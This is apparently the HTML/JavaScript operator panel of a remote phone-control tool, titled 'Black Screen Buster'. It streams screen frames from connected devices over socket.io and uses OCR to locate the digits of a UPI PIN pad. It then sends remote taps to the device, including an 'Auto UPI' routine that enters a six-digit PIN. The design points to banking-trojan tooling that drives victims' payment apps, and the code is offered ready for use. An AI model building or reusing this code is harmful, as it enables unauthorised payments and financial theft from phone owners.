<!DOCTYPE html>
<html>
<head>
    <title>üéØ UPI PIN LAYOUT LIVE - Black Screen Buster</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@4/dist/tesseract.min.js"></script>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
            background: linear-gradient(135deg,#0a0a1a,#1a1a3a); color: white; 
            height: 100vh; overflow: hidden;
        }
        #controls { 
            position: fixed; top: 20px; left: 20px; z-index: 100; 
            display: flex; flex-direction: column; gap: 12px;
        }
        button { 
            padding: 12px 24px; background: linear-gradient(45deg, #00ff88, #00cc6a); 
            color: #000; border: none; border-radius: 25px; cursor: pointer; 
            font-weight: 600; transition: all 0.2s; box-shadow: 0 6px 20px rgba(0,255,136,0.4);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,255,136,0.6); }
        button.danger { background: linear-gradient(45deg, #ff4444, #cc3333); }
        
        #phone-container { 
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            width: min(90vw, 420px); height: min(90vh, 850px); 
            background: #000; border-radius: 35px; padding: 25px 20px; 
            box-shadow: 0 25px 70px rgba(0,0,0,0.9); 
            border: 2px solid rgba(0,255,136,0.3); touch-action: none;
        }
        #screen { 
            width: 100%; height: 100%; border-radius: 20px; background: #111; 
            image-rendering: pixelated; cursor: pointer; 
            box-shadow: inset 0 2px 12px rgba(0,0,0,0.6);
        }
        
        #layout-overlay { 
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            pointer-events: none; border-radius: 20px;
        }
        .ui-element { 
            position: absolute; background: rgba(0,255,136,0.9); 
            border-radius: 6px; padding: 4px 8px; font-size: 12px; 
            font-weight: bold; color: #000; border: 1px solid #00ff88;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
        
        #status { 
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); 
            background: rgba(0,0,0,0.9); padding: 15px 25px; border-radius: 25px; 
            text-align: center; backdrop-filter: blur(20px);
        }
        #pin-pads { display: flex; gap: 10px; justify-content: center; margin-top: 8px; }
        .pin-btn { width: 45px; height: 45px; border-radius: 50%; font-size: 20px; font-weight: bold; }
        
        #debug { position: fixed; top: 20px; right: 20px; font-size: 12px; background: rgba(0,0,0,0.8); padding: 12px; border-radius: 10px; }
    </style>
</head>
<body>
    <div id="controls">
        <button onclick="toggleOCR()">üîç OCR Toggle</button>
        <button onclick="autoUpiPin()">ü§ñ Auto UPI</button>
        <button onclick="clearOverlay()" class="danger">üóëÔ∏è Clear</button>
    </div>

    <div id="phone-container">
        <div style="position: relative;">
            <canvas id="screen"></canvas>
            <canvas id="layout-overlay"></canvas>
        </div>
    </div>

    <div id="status">
        <div id="status-text">Waiting for device...</div>
        <div id="pin-pads"></div>
    </div>

    <div id="debug">
        FPS: <span id="fps">0</span> | OCR: <span id="ocr-status">OFF</span> | 
        Device: <span id="device-id">--</span>
    </div>

    <script>
        const socket = io({ transports: ['websocket'], timeout: 5000 });
        const screenCanvas = document.getElementById('screen');
        const overlayCanvas = document.getElementById('layout-overlay');
        const ctxScreen = screenCanvas.getContext('2d');
        const ctxOverlay = overlayCanvas.getContext('2d');
        
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let frameCount = 0, lastFrameTime = 0, ocrWorker = null;
        let layoutElements = [], isOcrEnabled = false, dragStart = {};
        let uiButtons = {}; // UPI 0-9 + Enter
        
        // üî• SOCKET EVENTS
        socket.on('screen-frame', (data) => {
            currentDevice = data.deviceId;
            deviceWidth = data.width || deviceWidth;
            deviceHeight = data.height || deviceHeight;
            
            document.getElementById('device-id').textContent = data.deviceId.slice(0,8);
            renderFrame(data);
            if (isOcrEnabled && frameCount % 10 === 0) analyzeLayout(data);
        });
        
        socket.on('devices-update', (devices) => {
            document.getElementById('status-text').textContent = 
                `${devices.filter(d => d[1].connected).length} devices live`;
        });

        // üî• FRAME RENDER + BLACK SCREEN SAFE
        function renderFrame(data) {
            const rect = screenCanvas.parentElement.getBoundingClientRect();
            screenCanvas.width = overlayCanvas.width = rect.width;
            screenCanvas.height = overlayCanvas.height = rect.height;
            
            const img = new Image();
            img.onload = () => {
                ctxScreen.imageSmoothingEnabled = false;
                ctxScreen.drawImage(img, 0, 0, rect.width, rect.height);
                updateFps();
                drawOverlay();
            };
            img.onerror = () => {
                // üî• BLACK SCREEN ‚Üí Show last known layout
                ctxScreen.fillStyle = '#222';
                ctxScreen.fillRect(0, 0, rect.width, rect.height);
                ctxScreen.fillStyle = '#ff0';
                ctxScreen.font = '24px monospace';
                ctxScreen.textAlign = 'center';
                ctxScreen.fillText('BLACK SCREEN SAFE', rect.width/2, rect.height/2);
                drawOverlay(); // Keep UI overlay
            };
            img.src = `data:image/jpeg;base64,${data.data}`;
        }

        function updateFps() {
            frameCount++;
            const now = performance.now();
            if (now - lastFrameTime >= 1000) {
                document.getElementById('fps').textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
                frameCount = 0; lastFrameTime = now;
            }
        }

        // üî• TESSERACT OCR - UPI LAYOUT DETECT
        async function analyzeLayout(frameData) {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const img = new Image();
                img.src = `data:image/jpeg;base64,${frameData.data}`;
                
                await new Promise(r => img.onload = r);
                canvas.width = img.width; canvas.height = img.height;
                ctx.drawImage(img, 0, 0);
                
                const { data: { text, words } } = await Tesseract.recognize(canvas, 'eng', {
                    logger: m => console.log(m)
                });
                
                // üî• UPI PIN BUTTONS DETECT (0-9 + Enter)
                layoutElements = words.filter(w => 
                    (w.text.match(/^[0-9]$/) || w.text.toLowerCase().includes('enter') || 
                     w.text.toLowerCase().includes('submit') || w.text.toLowerCase().includes('pin'))
                ).map(w => ({
                    text: w.text,
                    bbox: w.bbox,
                    confidence: w.confidence,
                    centerX: w.bbox.x0 + (w.bbox.x1 - w.bbox.x0) / 2,
                    centerY: w.bbox.y0 + (w.bbox.y1 - w.bbox.y0) / 2
                }));
                
                // üî• Auto create PIN buttons
                updatePinPads();
                drawOverlay();
                
                console.log('üîç OCR:', layoutElements.length, 'UI elements found');
            } catch(e) {
                console.log('OCR error:', e);
            }
        }

        // üî• OVERLAY - UI BUTTONS + COORDINATES
        function drawOverlay() {
            const rect = screenCanvas.getBoundingClientRect();
            ctxOverlay.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
            
            layoutElements.forEach(el => {
                const scaleX = overlayCanvas.width / deviceWidth;
                const scaleY = overlayCanvas.height / deviceHeight;
                
                const x = el.bbox.x0 * scaleX;
                const y = el.bbox.y0 * scaleY;
                const w = (el.bbox.x1 - el.bbox.x0) * scaleX;
                const h = (el.bbox.y1 - el.bbox.y0) * scaleY;
                
                // Button box
                ctxOverlay.strokeStyle = '#00ff88';
                ctxOverlay.lineWidth = 2;
                ctxOverlay.strokeRect(x, y, w, h);
                
                // Text label
                ctxOverlay.fillStyle = '#000';
                ctxOverlay.font = 'bold 14px monospace';
                ctxOverlay.fillText(el.text, x + 5, y + 18);
                
                // Coords
                ctxOverlay.fillStyle = '#ff0';
                ctxOverlay.font = '11px monospace';
                ctxOverlay.fillText(
                    `(${Math.round(el.centerX)},${Math.round(el.centerY)})`, 
                    x + 5, y + h - 5
                );
            });
        }

        // üî• UPI PIN BUTTONS
        function updatePinPads() {
            const pads = document.getElementById('pin-pads');
            pads.innerHTML = '';
            
            layoutElements.filter(el => el.text.match(/^[0-9]$/)).slice(0,10).forEach((el, i) => {
                const btn = document.createElement('button');
                btn.className = 'pin-btn';
                btn.textContent = el.text;
                btn.onclick = () => tapPin(el.centerX, el.centerY, el.text);
                pads.appendChild(btn);
            });
        }

        // üî• PRECISE TAP
        function getScaledCoords(clientX, clientY) {
            const rect = screenCanvas.parentElement.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.round((clientX - rect.left) * scaleX),
                y: Math.round((clientY - rect.top) * scaleY)
            };
        }

        ['mousedown', 'touchstart'].forEach(ev => 
            screenCanvas.addEventListener(ev, e => {
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                socket.emit('control', { deviceId: currentDevice, action: 'tap', x: coords.x, y: coords.y });
                console.log(`üéØ TAP (${coords.x},${coords.y})`);
            }, { passive: false })
        );

        // üî• AUTO UPI PIN
        async function autoUpiPin() {
            for (let i = 0; i < 6; i++) { // 6 digit PIN
                const pinBtn = document.querySelector('.pin-btn');
                if (pinBtn) {
                    pinBtn.click();
                    await new Promise(r => setTimeout(r, 500));
                }
            }
        }

        function tapPin(x, y, text) {
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'tap', 
                x: Math.round(x), 
                y: Math.round(y) 
            });
            console.log(`ü§ñ AUTO TAP "${text}" (${x},${y})`);
        }

        function toggleOCR() {
            isOcrEnabled = !isOcrEnabled;
            document.getElementById('ocr-status').textContent = isOcrEnabled ? 'ON' : 'OFF';
            document.getElementById('ocr-status').style.color = isOcrEnabled ? '#00ff88' : '#ff4444';
        }

        function clearOverlay() {
            layoutElements = [];
            drawOverlay();
            updatePinPads();
        }

        // üî• START
        toggleOCR(); // Auto ON
        console.log('üéØ BLACK SCREEN BUSTER READY!');
    </script>
</body>
</html>
